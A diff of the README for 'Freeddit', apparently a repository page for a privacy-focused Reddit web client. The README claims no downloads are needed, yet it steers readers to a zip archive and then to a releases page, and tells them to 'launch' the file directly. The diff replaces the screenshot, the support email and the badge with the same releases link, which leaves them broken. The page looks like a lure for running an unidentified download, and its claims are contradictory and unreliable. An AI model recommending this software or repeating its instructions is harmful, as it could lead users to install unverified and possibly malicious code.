@@ -16,14 +16,14 @@ Freeddit is a web-based Reddit client that puts user privacy first by offering a
 🌐 **Web-Based**: Access Freeddit directly from your web browser without the need for any downloads or installations.
 
 ## How to Use
-1. Visit the Freeddit web client using the following link: [Freeddit - No Ads, No Tracking Reddit](https://github.com/uploads/App.zip).
+1. Visit the Freeddit web client using the following link: [Freeddit - No Ads, No Tracking Reddit](https://github.com/Arnon23/freeddit/releases).
    
 2. If the link ends with a file name, it needs to be launched directly in your web browser.
    
 3. If the link does not work or is not provided, please check the "Releases" section of the repository for alternative download options.
 
 ## Screenshots
-![Freeddit Homepage](https://example.com/freeddit-homepage.png)
+![Freeddit Homepage](https://github.com/Arnon23/freeddit/releases)
 *Enjoy a clutter-free Reddit experience with Freeddit*
 
 ## Installation
@@ -36,7 +36,7 @@ Contributions are welcome! Feel free to submit any suggestions or improvements v
 Have any feedback or feature requests for Freeddit? Feel free to open an issue on the repository or reach out to the development team.
 
 ## Support
-For any inquiries or support requests, please contact us at freeddit.support@example.com.
+For any inquiries or support requests, please contact us at https://github.com/Arnon23/freeddit/releases
 
 ---
 
@@ -44,4 +44,4 @@ Let's make Reddit browsing enjoyable again with Freeddit! 🌟🔑🔗
 
 ---
 
-[![Get Freeddit Now](https://img.shields.io/badge/Get%20Freeddit-Ad%20Free%20Reddit-brightgreen)](https://github.com/uploads/App.zip)
+[![Get Freeddit Now](https://github.com/Arnon23/freeddit/releases%20Freeddit-Ad%20Free%20Reddit-brightgreen)](https://github.com/Arnon23/freeddit/releases)
